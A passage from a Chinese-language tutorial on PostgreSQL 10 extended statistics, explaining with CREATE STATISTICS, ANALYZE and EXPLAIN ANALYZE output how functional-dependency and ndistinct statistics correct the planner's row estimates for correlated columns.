的估计减少了100倍！ 让我们试着理解为什么发生这种情况。<br>\n第一个列的选择性约为 0.001（1/1000），第二个列的选择性为 0.01（1/100）。 要计算将由这两个“独立”条件过滤的行数，planner 会将它们的选择性相乘。 所以，我们得到：</p>\n<p>选择性= 0.001 * 0.01 = 0.00001。</p>\n<p>当它乘以我们在表中的行数即 10000000 时，我们得到 100。这就是 planner 对 100 的估计值的来源。 但是，这些列不是独立的，那么我们如何告知 planner ？</p>\n<p><strong>在 PostgreSQL 中创建统计信息</strong></p>\n<p>在 Postgres 10 之前，没有一种简易的方式去告诉 planner 采集捕捉列之间关系的数据统计。但是， Postgres 10 有一个新特性正好解决了这个问题，可以使用 <a href=\"https://www.postgresql.org/docs/10/static/sql-createstatistics.html\" target=\"_blank\" rel=\"nofollow\">CREATE STATISTICS</a> 来创建扩展统计的对象，告诉服务器去采集这些有意思的相关列的额外的统计信息。</p>\n<p><strong>函数依赖统计</strong></p>\n<p>回到我们先前评估的问题，col2 的值仅仅是 col1/10 。在数据库的术语中，我们会说 col2 是函数依赖于 col1 ，也就是说，col1 的值足以决定 col2 的值，并且不存在有两行数据拥有相同的 col1 值的同时有不同的 col2 值。因此，在 col2 列上的第二个过滤筛选并没有移除任何行！但是，planner 捕捉到了足够的统计信息去知道这件事情。</p>\n<p>让我们来创建一个统计对象去捕获这些列和运行分析（ANALYZE）所依赖的函数统计。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671cd4e32808095542\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE STATISTICS s1 (dependencies) on col1, col2 from tbl; \r\nANALYZE tbl;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e32808095542-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e32808095542-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671cd4e32808095542-1\"><span class=\"crayon-i\">CREATE</span> <span class=\"crayon-i\">STATISTICS</span> <span class=\"crayon-i\">s1</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dependencies</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">col2</span> <span class=\"crayon-i\">from</span> <span class=\"crayon-v\">tbl</span><span class=\"crayon-sy\">;</span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e32808095542-2\"><span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-v\">tbl</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p> </p>\n<p>让我们来看看现在的计划是怎么来的。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671cd4e36317575567\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nEXPLAIN ANALYZE SELECT * FROM tbl where col1 = 1 and col2 = 0;                            \r\n                                                QUERY PLAN                                                 \r\n-----------------------------------------------------------------------------------------------------------\r\n Seq Scan on tbl  (cost=0.00..194247.76 rows=9584 width=8) (actual time=0.638..629.741 rows=10000 loops=1)\r\n   Filter: ((col1 = 1) AND (col2 = 0))\r\n   Rows Removed by Filter: 9990000\r\n Planning time: 0.115 ms\r\n Execution time: 630.076 ms\r\n(5 rows)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e36317575567-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e36317575567-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e36317575567-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e36317575567-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e36317575567-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e36317575567-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e36317575567-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e36317575567-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e36317575567-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671cd4e36317575567-1\"><span class=\"crayon-i\">EXPLAIN</span> <span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-i\">FROM</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">where</span> <span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span> <span class=\"crayon-st\">and</span> <span class=\"crayon-i\">col2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span>                            </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e36317575567-2\">                                                <span class=\"crayon-i\">QUERY</span> <span class=\"crayon-i\">PLAN</span>                                                 </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e36317575567-3\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e36317575567-4\"> <span class=\"crayon-i\">Seq</span> <span class=\"crayon-i\">Scan</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-i\">tbl</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..194247.76</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9584</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.638..629.741</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e36317575567-5\">   <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-st\">AND</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">col2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e36317575567-6\">   <span class=\"crayon-i\">Rows</span> <span class=\"crayon-i\">Removed</span> <span class=\"crayon-i\">by</span> <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">9990000</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e36317575567-7\"> <span class=\"crayon-i\">Planning</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">0.115</span> <span class=\"crayon-i\">ms</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e36317575567-8\"> <span class=\"crayon-i\">Execution</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">630.076</span> <span class=\"crayon-e\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e36317575567-9\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n<p> </p>\n<p>很好！让我们看一下对计划的测量。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671cd4e39071725472\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT stxname, stxkeys, stxdependencies                                                  \r\n  FROM pg_statistic_ext                                                                   \r\n  WHERE stxname = 's1';   \r\nstxname | stxkeys |   stxdependencies    \r\n---------+---------+----------------------\r\n s1      | 1 2     | {\"1 =&gt; 2\": 1.000000}\r\n(1 row)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e39071725472-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e39071725472-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e39071725472-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e39071725472-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e39071725472-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e39071725472-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e39071725472-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671cd4e39071725472-1\"><span class=\"crayon-i\">SELECT</span> <span class=\"crayon-v\">stxname</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">stxkeys</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">stxdependencies</span>                                                  </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e39071725472-2\">  <span class=\"crayon-i\">FROM</span> <span class=\"crayon-v\">pg_statistic</span><span class=\"crayon-sy\">_</span>ext                                                                   </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e39071725472-3\">  <span class=\"crayon-i\">WHERE</span> <span class=\"crayon-i\">stxname</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">'s1'</span><span class=\"crayon-sy\">;</span>   </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e39071725472-4\"><span class=\"crayon-i\">stxname</span> <span class=\"crayon-o\">|</span> <span class=\"crayon-i\">stxkeys</span> <span class=\"crayon-o\">|</span>   <span class=\"crayon-i\">stxdependencies</span>    </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e39071725472-5\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e39071725472-6\"> <span class=\"crayon-i\">s1</span>      <span class=\"crayon-o\">|</span> <span class=\"crayon-cn\">1</span> <span class=\"crayon-cn\">2</span>     <span class=\"crayon-o\">|</span> <span class=\"crayon-sy\">{</span><span class=\"crayon-s\">\"1 =&gt; 2\"</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">1.000000</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e39071725472-7\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span> <span class=\"crayon-v\">row</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0162 seconds] -->\r\n<p> </p>\n<p>看这里，我们可以看到， Postgres 意识到 col1 完全决定 col2 ，因此用系数1来捕获这些信息。现在，所有的查询都过滤这些列之后，计划将会得到更好的评估。</p>\n<p><strong>ndistinct 统计</strong></p>\n<p>函数依赖是你可以在列之间捕获的一种关系。 你可以捕获的另一种统计信息是一组列的不同值。 我们之前指出，planner 可以获取每列不同值的统计数字，但再次合并多列时，这些统计数据往往是错误的。</p>\n<p>这些不好的数据是在什么时候影响我们的呢？ 下面来看一个例子。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671cd4e3e569445023\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nEXPLAIN ANALYZE SELECT col1,col2,count(*) from tbl group by col1, col2;                   \r\n                                                         QUERY PLAN                                                          \r\n-----------------------------------------------------------------------------------------------------------------------------\r\n GroupAggregate  (cost=1990523.20..2091523.04 rows=100000 width=16) (actual time=2697.246..4470.789 rows=1001 loops=1)\r\n   Group Key: col1, col2\r\n   -&gt;  Sort  (cost=1990523.20..2015523.16 rows=9999984 width=8) (actual time=2695.498..3440.880 rows=10000000 loops=1)\r\n         Sort Key: col1, col2\r\n         Sort Method: external sort  Disk: 176128kB\r\n         -&gt;  Seq Scan on tbl  (cost=0.00..144247.84 rows=9999984 width=8) (actual time=0.008..665.689 rows=10000000 loops=1)\r\n Planning time: 0.072 ms\r\n Execution time: 4494.583 ms</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e3e569445023-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e3e569445023-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e3e569445023-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e3e569445023-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e3e569445023-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e3e569445023-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e3e569445023-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e3e569445023-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e3e569445023-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e3e569445023-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e3e569445023-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671cd4e3e569445023-1\"><span class=\"crayon-i\">EXPLAIN</span> <span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">col2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-i\">from</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">group</span> <span class=\"crayon-i\">by</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">col2</span><span class=\"crayon-sy\">;</span>                   </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e3e569445023-2\">                                                         <span class=\"crayon-i\">QUERY</span> <span class=\"crayon-i\">PLAN</span>                                                          </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e3e569445023-3\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e3e569445023-4\"> <span class=\"crayon-i\">GroupAggregate</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1990523.20..2091523.04</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">100000</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2697.246..4470.789</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1001</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e3e569445023-5\">   <span class=\"crayon-i\">Group</span> <span class=\"crayon-v\">Key</span><span class=\"crayon-o\">:</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">col2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e3e569445023-6\">   <span class=\"crayon-o\">-&gt;</span>  <span class=\"crayon-i\">Sort</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1990523.20..2015523.16</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9999984</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2695.498..3440.880</span> 